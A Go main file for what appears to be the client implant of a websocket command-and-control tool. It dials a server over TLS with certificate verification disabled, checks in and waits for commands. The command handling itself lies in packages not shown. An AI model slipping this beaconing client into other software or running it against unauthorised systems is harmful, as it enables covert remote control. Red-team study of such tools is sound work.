package main

import (
	"crypto/tls"
	"fmt"
	"log"
	"time"

	"github.com/gorilla/websocket"
	"github.com/latortuga71/wsC2/internal/client"
	"github.com/latortuga71/wsC2/internal/data"
)

func main() {
	err := client.InitializeClient()
	if err != nil {
		log.Fatal("Failed to initialize client.")
	}
	socketUrl := fmt.Sprintf("wss://%s:443/socketClient", client.ServerHostName)
	websocket.DefaultDialer.TLSClientConfig = &tls.Config{
		InsecureSkipVerify: true,
		RootCAs:            client.Client.ClientCaCertPool,
		Certificates:       []tls.Certificate{client.Client.ClientTLSCertificate},
	}

	c, _, err := websocket.DefaultDialer.Dial(socketUrl, nil)
	client.Client.WSConn = data.NewConnection(c)
	if err != nil {
		log.Fatal("Error connecting to Websocket Server: ", err)
	}
	go client.ClientReceiveHandler(client.Client)
	client.ClientDoCheckIn(client.Client)
	for {
		select {
		case <-client.ClientInterrupt:
			log.Println("Received SIGINT interrupt signal. Closing all pending connections")
			err := client.Client.WSConn.WriteMessage(websocket.FormatCloseMessage(websocket.CloseNormalClosure, ""))
			if err != nil {
				log.Println("Error during closing websocket:", err)
			}
			close(client.ClientDone)
			select {
			case <-client.ClientDone:
				log.Println("Receiver Channel Closed! Exiting....")
			case <-time.After(time.Duration(1) * time.Second):
				log.Println("Timeout in closing receiving channel. Exiting....")
			}
			return
		}
	}
}
